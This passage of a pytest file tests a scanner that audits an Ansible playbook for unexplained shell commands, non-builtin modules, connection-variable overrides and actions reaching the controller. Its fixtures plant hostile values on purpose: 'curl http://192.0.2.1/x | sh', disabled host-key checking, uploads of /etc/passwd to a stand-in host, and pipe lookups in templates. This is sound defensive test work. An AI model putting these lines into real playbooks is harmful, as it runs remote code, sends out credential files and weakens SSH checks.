            named += [(f"{where}: its apply's vars", name) for name in args["apply"].get("vars") or {}]
    return [f"{where}: {name}" for where, name in named if str(name).startswith("ansible_")] + always


def _strings(value: object) -> Iterator[str]:
    """Every string of a document read from YAML, its keys among them."""
    if isinstance(value, str):
        yield value
    elif isinstance(value, dict):
        for each in (*value.keys(), *value.values()):
            yield from _strings(each)
    elif isinstance(value, list):
        for each in value:
            yield from _strings(each)


def reaching_this_computer(play: Path = PLAY, repo: Path = REPO, lookups: Iterable = LOOKUPS) -> list[str]:
    """Each thing the play reaches that would run or write on this computer, said by its file and where: a delegation,
    a connection keyword, a fetch, a group_by or add_host, a play over any host but all, a with_ loop, a lookup in a
    template, a lookup lookups does not list, by its file and whole string; and one lookups lists that is no longer
    there."""
    from ansible.module_utils.common.sentinel import Sentinel

    found = walk(play, repo)
    said: list[str] = []
    for path, each in found.plays:
        if each.get("hosts") != "all":
            said.append(f"{_where(path, repo)}: a play over {each.get('hosts')!r}, where layer 1's inventory is all")
        said += [f"{_where(path, repo)}: the play's {key}" for key in ELSEWHERE if key in each]
    for path, entry in found.roles:
        if isinstance(entry, dict):
            said += [f"{_where(path, repo)}: a role entry's {key}" for key in ELSEWHERE if key in entry]
    for path, task in found.entries:
        where = f"{_where(path, repo)}: {task.get('name', '')}"
        said += [f"{where}: {key}" for key in ELSEWHERE if key in task]
        said += [f"{where}: {key}, a lookup run here: loop over it instead" for key in task if key.startswith("with_")]
        if any(key in task for key in BLOCK):
            continue
        action, args, delegated = _parsed(task)
        if delegated is not Sentinel and not any(key in task for key in ELSEWHERE):
            said.append(f"{where}: delegated to {delegated!r}")
        if action in FETCH:
            said.append(f"{where}: {action}, which writes on this computer")
        if action in GROUPS:
            said.append(f"{where}: {action}, a group joined after the play's check of the connection")
        if action in TASK_INCLUDES | ROLE_INCLUDES and isinstance(args.get("apply"), dict):
            said += [f"{where}: its apply's {key}" for key in ELSEWHERE if key in args["apply"]]
    for path in found.templates:
        if LOOKUP.search(path.read_text()):
            said.append(f"{_where(path, repo)}: a lookup in a template")
    seen = {
        (_where(path, repo), text)
        for path in found.files
        for text in _strings(yaml.safe_load(path.read_text()))
        if LOOKUP.search(text)
    }
    listed = set(lookups)
    said += [f"{where}: a lookup LOOKUPS does not list, run here: {text!r}" for where, text in sorted(seen - listed)]
    said += [f"{where}: in LOOKUPS, and no longer there: {text!r}" for where, text in sorted(listed - seen)]
    return said


# ---------------------------------------------------------------------------------------------------- the rules ----


def test_every_command_shell_or_raw_the_play_reaches_has_its_reason_held_to_what_it_runs() -> None:
    assert unreasoned(commands(), REASONS) == []
    assert all(reason for reason, _, _ in REASONS.values())


def test_every_module_the_play_reaches_is_ansible_builtin_but_the_three_f6a_replaces() -> None:
    found = outside()
    assert found == {key: module for key, (module, _) in OUTSIDE.items()}, (
        "a module outside ansible.builtin that layer 1 reaches, which a Galaxy collection would have to bring: "
        f"{sorted(set(found.items()) - {(key, module) for key, (module, _) in OUTSIDE.items()})}"
    )
    assert {reason for _, reason in OUTSIDE.values()} == {"replaced by F6a"}


def test_nothing_the_play_reaches_sets_an_ansible_variable() -> None:
    assert setting_connection_variables() == []


def test_nothing_the_play_reaches_runs_or_writes_on_this_computer_but_the_lookups_listed() -> None:
    assert reaching_this_computer() == []
    assert all(LOOKUPS.values())


def test_the_walk_reaches_what_the_play_runs() -> None:
    found = walk()
    files = {_where(path, REPO) for path in found.files}
    # The play, its shared task file, each role's entry point and what it includes, the handlers, the defaults and vars,
    # and each role's argument specs, which the lookups' scan reads.
    assert {
        "playbooks/system.yml",
        "playbooks/tasks/remote_tmp.yml",
        "roles/common/meta/main.yml",
        "roles/common/meta/argument_specs.yml",
        "roles/vscode_server/meta/argument_specs.yml",
        "roles/dev_tools/meta/argument_specs.yml",
        "roles/common/tasks/main.yml",
        "roles/common/tasks/sudo.yml",
        "roles/common/tasks/masked_units.yml",
        "roles/common/handlers/main.yml",
        "roles/vscode_server/tasks/main.yml",
        "roles/vscode_server/handlers/main.yml",
        "roles/dev_tools/tasks/main.yml",
        "roles/dev_tools/tasks/node.yml",
        "roles/dev_tools/tasks/rust.yml",
    } <= files, files
    # Nothing of the roles the play does not run, nor an image's entry point.
    assert not [each for each in files if each.startswith(("roles/claude_code/", "roles/github_projects/"))]
    assert "roles/common/tasks/image.yml" not in files
    # The roles' defaults and internals, whose variables the third rule reads, and the templates the fourth reads.
    assert {_where(path, REPO) for path in found.variables} == {
        "roles/common/defaults/main.yml",
        "roles/common/vars/main.yml",
        "roles/vscode_server/defaults/main.yml",
        "roles/dev_tools/defaults/main.yml",
    }
    assert {path.name for path in found.templates} == {
        "sudoers.j2",
        "local-bin-path.sh.j2",
        "sshd_path.conf.j2",
        "sshd_hardening.conf.j2",
        "20-vscode-server.conf.j2",
        "cargo-bin-path.sh.j2",
    }
    # The three roles, from the play, as their entries.
    roles = [{"role": role, "tags": [role]} for role in ("common", "vscode_server", "dev_tools")]
    assert [entry for _, entry in found.roles] == roles


def test_the_play_s_folder_holds_the_folders_of_plugins_listed_and_no_name_of_ansible_s_own() -> None:
    # Each kind, and each name of Ansible's own, read from Ansible itself: a reading that found none would hold nothing.
    kinds = plugin_folders()
    assert {"library", "module_utils", "action_plugins", "filter_plugins", "vars_plugins", "callback_plugins"} <= kinds
    assert {"setup", "ping", "copy", "normal", "template", "basic", "common"} <= ansibles_own()
    assert set(BESIDE_THE_PLAY) <= kinds and all(BESIDE_THE_PLAY.values())
    # Of what Ansible would take from the play's folder, the three listed alone; the walk holds their names.
    beside = {entry.name for entry in PLAY.parent.iterdir()}
    assert beside & (kinds | {"collections", *HOST_VARIABLES}) == set(BESIDE_THE_PLAY)
    _beside_the_play(PLAY.parent, REPO)


# ------------------------------------------------------------------------------- the scans see what they hold ----

# A tree of a test's own: the play, with a shared task file and one role, laid under a test's directory; a road is
# changes laid over it, by each file's path (None takes a file out, a string is a file's text).
BASE: dict[str, object] = {
    "playbooks/system.yml": [
        {
            "name": "p",
            "hosts": "all",
            "pre_tasks": [{"name": "shared tasks", "ansible.builtin.import_tasks": "tasks/shared.yml"}],
            "roles": [{"role": "one", "tags": ["one"]}],
        }
    ],
    "playbooks/tasks/shared.yml": [{"name": "shared", "ansible.builtin.ping": {}}],
    "roles/one/tasks/main.yml": [{"name": "ok", "ansible.builtin.ping": {}}],
    "roles/one/defaults/main.yml": {"one_x": 1},
}
PING = {"name": "t", "ansible.builtin.ping": {}}
# A file of the role's own files/, which a copy of src x sends from this computer.
ROLE_FILE = {"roles/one/files/x": "x\n"}
# A command that runs whatever an address sends, as review 45 planted it.
SHELL = {"name": "c", "ansible.builtin.shell": "curl http://192.0.2.1/x | sh"}
FOUND = ("ansible.builtin.shell", {"_raw_params": "curl http://192.0.2.1/x | sh"})
# A connection variable, and a value of it that would loosen the host key's checking.
NAME, LOOSE = "ansible_ssh_common_args", "-o StrictHostKeyChecking=no"


def _with(**keys: object) -> list:
    """BASE's play with keys of its own."""
    return [{**BASE["playbooks/system.yml"][0], **keys}]  # type: ignore[index]


def _planted(root: Path, changes: dict[str, object]) -> Path:
    """BASE with changes laid over it, written under root: the play's path."""
    for name, data in {**BASE, **changes}.items():
        if data is not None:
            path = root / name
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(data if isinstance(data, str) else yaml.safe_dump(data))
    return root / "playbooks" / "system.yml"


def _in_one(*tasks: dict) -> dict[str, object]:
    """The role's tasks/main.yml holding tasks."""
    return {"roles/one/tasks/main.yml": list(tasks)}


def _role_two(**tasks_from: list) -> dict[str, object]:
    """A second role, two, with a shell in its tasks/main.yml, or in tasks/<name>.yml for each name given."""
    return {f"roles/two/tasks/{name}.yml": listed for name, listed in ({"main": [SHELL]} | tasks_from).items()}


# Each road to a command, and the file the command is found in: the review's roads (a role a meta/main.yml names among
# its dependencies, a role included or imported from a role's own tasks), and the spellings and files Ansible takes.
COMMAND_ROADS: dict[str, tuple[dict[str, object], str]] = {
    "a role under meta dependencies": (
        {"roles/one/meta/main.yml": {"dependencies": ["two"]}, **_role_two()},
        "roles/two/tasks/main.yml",
    ),
    "a role a meta dependency names by its role key": (
        {"roles/one/meta/main.yml": {"dependencies": [{"role": "two"}]}, **_role_two()},
        "roles/two/tasks/main.yml",
    ),
    "include_role from a role's tasks": (
        {**_in_one({"name": "i", "ansible.builtin.include_role": {"name": "two"}}), **_role_two()},
        "roles/two/tasks/main.yml",
    ),
    "import_role from a role's tasks": (
        {**_in_one({"name": "i", "ansible.builtin.import_role": {"name": "two"}}), **_role_two()},
        "roles/two/tasks/main.yml",
    ),
    "a short include_role by its role key": (
        {**_in_one({"name": "i", "include_role": {"role": "two"}}), **_role_two()},
        "roles/two/tasks/main.yml",
    ),
    "a role's tasks_from": (
        {
            **_in_one({"name": "i", "ansible.builtin.include_role": {"name": "two", "tasks_from": "other"}}),
            **_role_two(other=[SHELL]),
        },
        "roles/two/tasks/other.yml",
    ),
    "a role's handlers_from": (
        {
            **_in_one({"name": "i", "ansible.builtin.include_role": {"name": "two", "handlers_from": "other"}}),
            "roles/two/handlers/other.yml": [SHELL],
        },
        "roles/two/handlers/other.yml",
    ),
    "a short include_tasks in a role": (
        {**_in_one({"name": "i", "include_tasks": "more.yml"}), "roles/one/tasks/more.yml": [SHELL]},
        "roles/one/tasks/more.yml",
    ),
    "an ansible.legacy import_tasks in a role": (
        {**_in_one({"name": "i", "ansible.legacy.import_tasks": "more.yml"}), "roles/one/tasks/more.yml": [SHELL]},
        "roles/one/tasks/more.yml",
    ),
    "an include given as a file in a role": (
        {
            **_in_one({"name": "i", "ansible.builtin.include_tasks": {"file": "more.yml"}}),
            "roles/one/tasks/more.yml": [SHELL],
        },
        "roles/one/tasks/more.yml",
    ),
    "a role's tasks in main.yaml": (
        {"roles/one/tasks/main.yml": None, "roles/one/tasks/main.yaml": [SHELL]},
        "roles/one/tasks/main.yaml",
    ),
    "a role's handlers in main.json": ({"roles/one/handlers/main.json": [SHELL]}, "roles/one/handlers/main.json"),
    "a role's handlers": ({"roles/one/handlers/main.yml": [SHELL]}, "roles/one/handlers/main.yml"),
    "include_role from the play": (
        {
            "playbooks/system.yml": _with(
                tasks=[{"name": "i", "ansible.builtin.include_role": {"name": "two", "tasks_from": "other"}}]
            ),
            **_role_two(other=[SHELL]),
        },
        "roles/two/tasks/other.yml",
    ),
    "the play's post_tasks": ({"playbooks/system.yml": _with(post_tasks=[SHELL])}, "playbooks/system.yml"),
    "the play's handlers": ({"playbooks/system.yml": _with(handlers=[SHELL])}, "playbooks/system.yml"),
    "an include in a play's shared file": (
        {
            "playbooks/tasks/shared.yml": [{"name": "i", "include_tasks": "deeper.yml"}],
            "playbooks/tasks/deeper.yml": [SHELL],
        },
        "playbooks/tasks/deeper.yml",
    ),
    "an include in a file a role's include brought in": (
        {
            **_in_one({"name": "i", "include_tasks": "inner.yml"}),
            "roles/one/tasks/inner.yml": [{"name": "j", "ansible.builtin.include_tasks": "more.yml"}],
            "roles/one/tasks/more.yml": [SHELL],
        },
        "roles/one/tasks/more.yml",
    ),
    "a role's file that includes itself": (
        {
            **_in_one({"name": "i", "include_tasks": "more.yml"}),
            "roles/one/tasks/more.yml": [{"name": "again", "include_tasks": "more.yml", "when": "x"}, SHELL],
        },
        "roles/one/tasks/more.yml",
    ),
}


@pytest.mark.parametrize("road", sorted(COMMAND_ROADS))
def test_a_command_on_every_road_the_play_has_to_a_task_is_found(tmp_path: Path, road: str) -> None:
    changes, where = COMMAND_ROADS[road]
    play = _planted(tmp_path, changes)
    assert commands(play, tmp_path) == {(where, "c"): FOUND}
    assert unreasoned(commands(play, tmp_path), {}) == [
        f"{(where, 'c')}: a command, shell or raw task REASONS gives no reason"
    ]


@pytest.mark.parametrize(
    ("task", "module"),
    [
        ({"name": "c", "ansible.builtin.command": {"argv": ["true"]}}, "ansible.builtin.command"),
        ({"name": "c", "command": "true"}, "command"),
        ({"name": "c", "ansible.legacy.shell": "true"}, "ansible.legacy.shell"),
        ({"name": "c", "ansible.builtin.raw": "true"}, "ansible.builtin.raw"),
        ({"name": "c", "ansible.builtin.script": "x.sh"}, "ansible.builtin.script"),
        ({"name": "c", "action": "ansible.builtin.shell true"}, "ansible.builtin.shell"),
        ({"name": "c", "ansible.builtin.expect": {"command": "true", "responses": {}}}, "ansible.builtin.expect"),
    ],
    ids=["command", "short", "legacy shell", "raw", "script", "action", "expect"],
)
def test_a_command_anywhere_the_play_reaches_is_found(tmp_path: Path, task: dict, module: str) -> None:
    # In a block's rescue, in a task file the role's entry point includes, with a loop and a condition.
    nested = {"name": "b", "block": [{"name": "ok", "ansible.builtin.ping": {}}], "rescue": [{**task, "loop": [1]}]}
    changes = {
        **_in_one({"name": "inc", "ansible.builtin.include_tasks": "deep.yml", "when": "x"}),
        "roles/one/tasks/deep.yml": [nested],
    }
    found = commands(_planted(tmp_path, changes), tmp_path)
    assert list(found) == [("roles/one/tasks/deep.yml", "c")] and found[("roles/one/tasks/deep.yml", "c")][0] == module


def test_a_module_outside_ansible_builtin_is_found_by_any_spelling(tmp_path: Path) -> None:
    changes = (
        _in_one(
            {"name": "a", "community.general.npm": {"name": "x"}},
            {"name": "b", "ansible.legacy.copy": {"src": "x", "dest": "y"}},
            {"name": "c", "copy": {"src": "x", "dest": "y"}},
            {"name": "d", "ansible.builtin.copy": {"src": "x", "dest": "y"}},
        )
        | ROLE_FILE
    )
    assert outside(_planted(tmp_path, changes), tmp_path) == {
        ("roles/one/tasks/main.yml", "a"): "community.general.npm",
        ("roles/one/tasks/main.yml", "b"): "ansible.legacy.copy",
        ("roles/one/tasks/main.yml", "c"): "copy",
    }


# Each road the walk does not follow, which fails every test: what Ansible resolves otherwise or later, a name only a
# run can say, and a file or a role Ansible would find somewhere the walk does not look.
UNFOLLOWED_ROADS: dict[str, dict[str, object]] = {
    "an include in a role's handler": {
        "roles/one/handlers/main.yml": [{"name": "h", "ansible.builtin.include_tasks": "more.yml"}],
        "roles/one/tasks/more.yml": [SHELL],
    },
    "an import_role in the play's handler": {
        "playbooks/system.yml": _with(handlers=[{"name": "h", "ansible.builtin.import_role": {"name": "two"}}]),
        **_role_two(),
    },
    "a playbook imported after the play": {
        "playbooks/system.yml": [*_with(), {"ansible.builtin.import_playbook": "more.yml"}],
        "playbooks/more.yml": [{"hosts": "all", "tasks": [SHELL]}],
    },
    "a playbook imported as a task": {
        "playbooks/tasks/shared.yml": [{"name": "i", "import_playbook": "more.yml"}],
    },
    "a templated include": _in_one({"name": "i", "ansible.builtin.include_tasks": "{{ which }}.yml"}),
    "an include of a file that is not there": _in_one({"name": "i", "ansible.builtin.include_tasks": "nowhere.yml"}),
    "an include with a way up": _in_one({"name": "i", "ansible.builtin.include_tasks": "../../two/tasks/main.yml"}),
    "a templated role": _in_one({"name": "i", "ansible.builtin.include_role": {"name": "{{ which }}"}}),
    "a role of a collection": _in_one({"name": "i", "ansible.builtin.include_role": {"name": "community.general.x"}}),
    "a role the roles' folder does not hold": _in_one({"name": "i", "ansible.builtin.include_role": {"name": "three"}}),
    "a tasks_from that is not there": _in_one(
        {"name": "i", "ansible.builtin.include_role": {"name": "one", "tasks_from": "nowhere"}}
    ),
    "a templated tasks_from": _in_one(
        {"name": "i", "ansible.builtin.include_role": {"name": "one", "tasks_from": "{{ which }}"}}
    ),
    "a role in the play's own roles folder": {"playbooks/roles/one/tasks/main.yml": [SHELL]},
    "a play's collections keyword": {"playbooks/system.yml": _with(collections=["community.general"])},
    "a task's collections keyword": _in_one({**PING, "collections": ["community.general"]}),
    "a role's collections in its meta": {"roles/one/meta/main.yml": {"collections": ["community.general"]}},
    "a templated vars_files": {"playbooks/system.yml": _with(vars_files=["{{ which }}.yml"])},
    "a template outside a role": {
        "playbooks/tasks/shared.yml": [{"name": "t", "ansible.builtin.template": {"src": "x.j2", "dest": "/x"}}],
    },
    "a template that includes another": {
        **_in_one({"name": "t", "ansible.builtin.template": {"src": "x.j2", "dest": "/x"}}),
        "roles/one/templates/x.j2": "{% include 'y.j2' %}\n",
        "roles/one/templates/y.j2": "{{ lookup('ansible.builtin.pipe', 'id') }}\n",
    },
    "a template that includes another, its whitespace kept": {
        **_in_one({"name": "t", "ansible.builtin.template": {"src": "x.j2", "dest": "/x"}}),
        "roles/one/templates/x.j2": "{%+ include 'y.j2' %}\n",
        "roles/one/templates/y.j2": "{{ lookup('ansible.builtin.pipe', 'id') }}\n",
    },
    # Review 50's high 1: a task file Ansible looks for elsewhere first, a decoy planted where it looks.
    "an import in a file a role's include brought in": {
        **_in_one({"name": "i", "include_tasks": "inner.yml"}),
        "roles/one/tasks/inner.yml": [{"name": "j", "ansible.builtin.import_tasks": "more.yml"}],
        "roles/one/tasks/more.yml": [PING],
        "roles/one/tasks/tasks/more.yml": [SHELL],
    },
    "an import in a file a role's import brought in": {
        **_in_one({"name": "i", "ansible.legacy.import_tasks": "inner.yml"}),
        "roles/one/tasks/inner.yml": [{"name": "j", "import_tasks": "more.yml"}],
        "roles/one/tasks/more.yml": [PING],
        "roles/one/tasks/tasks/more.yml": [SHELL],
    },
    "an import in a role's file reached first as its entry, then by an include": {
        "playbooks/system.yml": _with(
            tasks=[{"name": "e", "ansible.builtin.include_role": {"name": "one", "tasks_from": "inner"}}]
        ),
        **_in_one({"name": "i", "include_tasks": "inner.yml"}),
        "roles/one/tasks/inner.yml": [{"name": "j", "import_tasks": "more.yml"}],
        "roles/one/tasks/more.yml": [PING],
        "roles/one/tasks/tasks/more.yml": [SHELL],
    },
    "an import two files below the play": {
        "playbooks/tasks/shared.yml": [{"name": "i", "ansible.builtin.import_tasks": "a.yml"}],
        "playbooks/tasks/a.yml": [{"name": "j", "ansible.builtin.import_tasks": "b.yml"}],
        "playbooks/tasks/b.yml": [PING],
        "playbooks/b.yml": [SHELL],
    },
    "an include two files below the play": {
        "playbooks/tasks/shared.yml": [{"name": "i", "ansible.builtin.include_tasks": "a.yml"}],
        "playbooks/tasks/a.yml": [{"name": "j", "include_tasks": "b.yml"}],
        "playbooks/tasks/b.yml": [PING],
        "playbooks/b.yml": [SHELL],
    },
    # Review 50's high 2: what Ansible takes from the play's folder and a role's, beyond the walk.
    "filter plugins beside the play": {"playbooks/filter_plugins/x.py": ""},
    "vars plugins beside the play": {"playbooks/vars_plugins/x.py": ""},
    "collections beside the play": {"playbooks/collections/ansible_collections/x/y/plugins/modules/z.py": ""},
    "an action named as Ansible's normal beside the play": {"playbooks/action_plugins/normal.py": ""},
    "a module named as Ansible's setup beside the play": {"playbooks/library/setup.py": ""},
    "a module_utils named as Ansible's basic beside the play": {"playbooks/module_utils/basic.py": ""},
    "a module_utils package named as Ansible's common beside the play": {
        "playbooks/module_utils/common/__init__.py": ""
    },
    "an action named as Ansible's alias beside the play": {"playbooks/action_plugins/_ping.py": ""},
    "group_vars beside the play": {"playbooks/group_vars/all.yml": {"x": 1}},
    "host_vars beside the play": {"playbooks/host_vars/alpha.yml": {"x": 1}},
    "callback plugins in a role": {"roles/one/callback_plugins/x.py": ""},
    "a library in a role": {"roles/one/library/x.py": ""},
    "module_utils in a role": {"roles/one/module_utils/x.py": ""},
    "doc fragments in a role": {"roles/one/doc_fragments/x.py": ""},
    "lookup plugins in a role the play's role includes": {
        **_in_one({"name": "i", "ansible.builtin.include_role": {"name": "two"}}),
        **_role_two(main=[PING]),
        "roles/two/lookup_plugins/x.py": "",
    },
    # A file of this computer sent to the machine from anywhere but its role's files/.
    "a copy outside a role": {
        "playbooks/tasks/shared.yml": [{"name": "c", "ansible.builtin.copy": {"src": "x", "dest": "/y"}}],
        "playbooks/files/x": "x\n",
    },
    "a copy's src with a way up": {
        **_in_one({"name": "c", "copy": {"src": "../../two/files/x", "dest": "/y"}}),
        "roles/two/files/x": "x\n",
    },
    "a copy's absolute src": _in_one({"name": "c", "ansible.builtin.copy": {"src": "/etc/passwd", "dest": "/y"}}),
    "a copy's templated src": _in_one({"name": "c", "ansible.builtin.copy": {"src": "{{ x }}", "dest": "/y"}}),
    "a copy's src its role does not hold": {
        **_in_one({"name": "c", "ansible.legacy.copy": {"src": "x", "dest": "/y"}}),
        "playbooks/files/x": "x\n",
    },
    "a copy's src that is a folder": {
        **_in_one({"name": "c", "ansible.builtin.copy": {"src": "d", "dest": "/y"}}),
        "roles/one/files/d/x": "x\n",
    },
    "a copy with remote_src false": _in_one(
        {"name": "c", "ansible.builtin.copy": {"src": "/etc/passwd", "dest": "/y", "remote_src": False}}
    ),
    "a copy with a templated remote_src": _in_one(
        {"name": "c", "ansible.builtin.copy": {"src": "/etc/passwd", "dest": "/y", "remote_src": "{{ x }}"}}
    ),
    "an assemble with remote_src false": _in_one(
        {"name": "a", "ansible.builtin.assemble": {"src": "/etc/ssh", "dest": "/y", "remote_src": False}}
    ),
    "an unarchive's absolute src": _in_one({"name": "u", "unarchive": {"src": "/tmp/a.tgz", "dest": "/y"}}),
    "an unarchive's old copy key beside remote_src": _in_one(
        {"name": "u", "unarchive": {"src": "/tmp/a.tgz", "dest": "/y", "copy": True, "remote_src": True}}
    ),
    "a uri's absolute src": _in_one(
        {"name": "u", "ansible.builtin.uri": {"url": "https://192.0.2.1/", "method": "PUT", "src": "/etc/passwd"}}
    ),
    "a uri's multipart upload": _in_one(
        {
            "name": "u",
            "ansible.builtin.uri": {
                "url": "https://192.0.2.1/",
                "method": "POST",
                "body_format": "form-multipart",
                "body": {"f": {"filename": "/etc/passwd"}},
            },
        }
    ),
    "a copy's src named under files/": {
        **_in_one({"name": "c", "ansible.builtin.copy": {"src": "files/x", "dest": "/y"}}),
        "roles/one/files/files/x": "x\n",
    },
    "a template named under templates/": {
        **_in_one({"name": "t", "ansible.builtin.template": {"src": "templates/x.j2", "dest": "/x"}}),
        "roles/one/templates/templates/x.j2": "x\n",
        "roles/one/templates/x.j2": "{{ lookup('ansible.builtin.pipe', 'id') }}\n",
    },
    "a uri's templated body format and body": _in_one(
        {
            "name": "u",
            "uri": {"url": "https://192.0.2.1/", "method": "POST", "body_format": "{{ x }}", "body": "{{ y }}"},
        }
    ),
}
SCANS = (commands, outside, setting_connection_variables, reaching_this_computer)


def test_a_file_of_its_role_s_files_or_of_the_machine_s_is_followed(tmp_path: Path) -> None:
    sent = {"url": "https://192.0.2.1/", "method": "POST", "body_format": "form-multipart"}
    changes = (
        _in_one(
            {"name": "a", "ansible.builtin.copy": {"src": "x", "dest": "/y"}},
            {"name": "b", "ansible.builtin.copy": {"src": "d/x", "dest": "/y"}},
            {"name": "c", "ansible.builtin.copy": {"src": "/etc/hosts", "dest": "/y", "remote_src": True}},
            {"name": "d", "ansible.builtin.assemble": {"src": "/etc/ssh", "dest": "/y"}},
            {"name": "e", "ansible.builtin.unarchive": {"src": "/tmp/a.tgz", "dest": "/y", "remote_src": True}},
            {"name": "f", "ansible.builtin.uri": {**sent, "body": {"f": {"filename": "x"}, "g": "text"}}},
            {
                "name": "g",
                "ansible.builtin.uri": {"url": "https://192.0.2.1/", "body_format": "json", "body": "{{ x }}"},
            },
            {"name": "h", "ansible.builtin.copy": {"content": "{{ x }}", "dest": "/y"}},
        )
        | ROLE_FILE
        | {"roles/one/files/d/x": "x\n"}
    )
    play = _planted(tmp_path, changes)
    assert walk(play, tmp_path).entries
    assert reaching_this_computer(play, tmp_path, lookups={}) == []


def test_the_walk_follows_a_role_s_include_in_an_included_file_and_ends_where_one_includes_itself(
    tmp_path: Path,
) -> None:
    changes = {
        **_in_one({"name": "i", "include_tasks": "inner.yml"}),
        "roles/one/tasks/inner.yml": [{"name": "j", "include_tasks": "inner.yml", "when": "x"}, PING],
    }
    found = walk(_planted(tmp_path, changes), tmp_path)
    # Each task once, though the file is walked again deeper.
    assert [task["name"] for path, task in found.entries if path.name == "inner.yml"] == ["j", "t"]


@pytest.mark.parametrize("road", sorted(UNFOLLOWED_ROADS))
@pytest.mark.parametrize("scan", SCANS, ids=[scan.__name__ for scan in SCANS])
def test_a_road_the_walk_does_not_follow_fails_every_test(tmp_path: Path, road: str, scan) -> None:
    play = _planted(tmp_path, UNFOLLOWED_ROADS[road])
    with pytest.raises(Unfollowed):
        scan(play, tmp_path)


@pytest.mark.parametrize(
    ("task", "link", "said"),
    [
        ({"name": "c", "ansible.builtin.copy": {"src": "x", "dest": "/y"}}, "files/x", "no file of its role's files/"),
        (
            {"name": "t", "ansible.builtin.template": {"src": "x.j2", "dest": "/x"}},
            "templates/x.j2",
            "not in its role's templates/",
        ),
    ],
)
def test_a_link_out_of_its_role_s_files_or_templates_is_refused(tmp_path: Path, task, link, said) -> None:
    elsewhere = tmp_path / "elsewhere"
    elsewhere.write_text("{{ lookup('ansible.builtin.pipe', 'id') }}\n")
    root = tmp_path / "repo"
    play = _planted(root, _in_one(task))
    (root / "roles" / "one" / link).parent.mkdir(parents=True, exist_ok=True)
    (root / "roles" / "one" / link).symlink_to(elsewhere)
    with pytest.raises(Unfollowed, match=said):
        walk(play, root)


def test_a_name_stands_for_one_task_and_a_reason_for_its_arguments(tmp_path: Path) -> None:
    listed = {"name": "c", "ansible.builtin.command": {"argv": ["sudo", "-l"]}}
    reasons = {("roles/one/tasks/main.yml", "c"): ("a read", "ansible.builtin.command", {"argv": ["sudo", "-l"]})}
    assert (
        unreasoned(commands(_planted(tmp_path / "as listed", _in_one(listed)), tmp_path / "as listed"), reasons) == []
    )
    # Its words changed under its name: the reason no longer holds it.
    changed = {**listed, "ansible.builtin.command": {"argv": ["sh", "-c", "curl http://192.0.2.1/x | sh"]}}
    found = commands(_planted(tmp_path / "changed", _in_one(changed)), tmp_path / "changed")
    assert unreasoned(found, reasons) == [
        "('roles/one/tasks/main.yml', 'c'): runs ('ansible.builtin.command', {'argv': ['sh', '-c', 'curl"
        " http://192.0.2.1/x | sh']}), where its reason is held to ('ansible.builtin.command', {'argv': ['sudo',"
        " '-l']}): change both together"
    ]
    # Another module under the same name and arguments: the same.
    module = {"name": "c", "ansible.builtin.shell": {"argv": ["sudo", "-l"]}}
    found = commands(_planted(tmp_path / "module", _in_one(module)), tmp_path / "module")
    assert len(unreasoned(found, reasons)) == 1
    # A second task of the listed one's name, beside it: two tasks under one key.
    root = tmp_path / "twice"
    play = _planted(root, _in_one(listed, {**SHELL, "name": "c"}))
    with pytest.raises(Repeated, match=r"^two commands of one file and name, \('roles/one/tasks/main.yml', 'c'\)"):
        commands(play, root)
    root = tmp_path / "twice outside"
    play = _planted(
        root, _in_one({"name": "n", "community.general.npm": {}}, {"name": "n", "ansible.posix.sysctl": {}})
    )
    with pytest.raises(Repeated, match="^two tasks outside ansible.builtin of one file and name"):
        outside(play, root)


# Each place a variable that would outrank the connection is set, and what the third test says of it.
WITH_TWO = {**_in_one({"name": "i", "ansible.builtin.include_role": {"name": "two"}}), **_role_two(main=[PING])}
VARIABLE_ROADS: dict[str, tuple[dict[str, object], str]] = {
    "a play's vars": (
        {"playbooks/system.yml": _with(vars={NAME: LOOSE})},
        f"playbooks/system.yml: the play's vars: {NAME}",
    ),
    "a play's vars_files": (
        {"playbooks/system.yml": _with(vars_files=["vars.yml"]), "playbooks/vars.yml": {NAME: LOOSE}},
        f"playbooks/vars.yml: {NAME}",
    ),
    "a play's vars_prompt": (
        {"playbooks/system.yml": _with(vars_prompt=[{"name": NAME, "prompt": "x"}])},
        f"playbooks/system.yml: the play's vars_prompt: {NAME}",
    ),
    "a role entry's vars": (
        {"playbooks/system.yml": _with(roles=[{"role": "one", "vars": {NAME: LOOSE}}])},
        f"playbooks/system.yml: a role's vars: {NAME}",
    ),
    "a role entry's params": (
        {"playbooks/system.yml": _with(roles=[{"role": "one", NAME: LOOSE}])},
        f"playbooks/system.yml: a role's params: {NAME}",
    ),
    "a meta dependency's vars": (
        {
            "roles/one/meta/main.yml": {"dependencies": [{"role": "two", "vars": {NAME: LOOSE}}]},
            **_role_two(main=[PING]),
        },
        f"roles/one/meta/main.yml: a role's vars: {NAME}",
    ),
    "a meta dependency's params": (
        {"roles/one/meta/main.yml": {"dependencies": [{"role": "two", NAME: LOOSE}]}, **_role_two(main=[PING])},
        f"roles/one/meta/main.yml: a role's params: {NAME}",
    ),
    "a role's defaults/main.yml": (
        {"roles/one/defaults/main.yml": {NAME: LOOSE}},
        f"roles/one/defaults/main.yml: {NAME}",
    ),
    "a role's defaults/main.yaml": (
        {"roles/one/defaults/main.yml": None, "roles/one/defaults/main.yaml": {NAME: LOOSE}},
        f"roles/one/defaults/main.yaml: {NAME}",
    ),
    "a role's vars/main/ folder": ({"roles/one/vars/main/a.yml": {NAME: LOOSE}}, f"roles/one/vars/main/a.yml: {NAME}"),
    "an include_role's vars_from": (
        {
            **_in_one({"name": "i", "ansible.builtin.include_role": {"name": "two", "vars_from": "other"}}),
            **_role_two(main=[PING]),
            "roles/two/vars/other.yml": {NAME: LOOSE},
        },
        f"roles/two/vars/other.yml: {NAME}",
    ),
    "the defaults of a role a role includes": (
        {**WITH_TWO, "roles/two/defaults/main.yml": {NAME: LOOSE}},
        f"roles/two/defaults/main.yml: {NAME}",
    ),
    "a task's vars": (_in_one({**PING, "vars": {NAME: LOOSE}}), f"roles/one/tasks/main.yml: t: {NAME}"),
    "a block's vars": (
        _in_one({"name": "b", "block": [PING], "vars": {NAME: LOOSE}}),
        f"roles/one/tasks/main.yml: b: {NAME}",
    ),
    "a fact": (
        _in_one({"name": "t", "ansible.builtin.set_fact": {NAME: LOOSE}}),
        f"roles/one/tasks/main.yml: t: {NAME}",
    ),
    "a fact as k=v": (_in_one({"name": "t", "set_fact": f"{NAME}=x"}), f"roles/one/tasks/main.yml: t: {NAME}"),
    "a fact of a templated name": (
        _in_one({"name": "t", "ansible.builtin.set_fact": {"{{ 'ansible_ssh_' ~ 'common_args' }}": LOOSE}}),
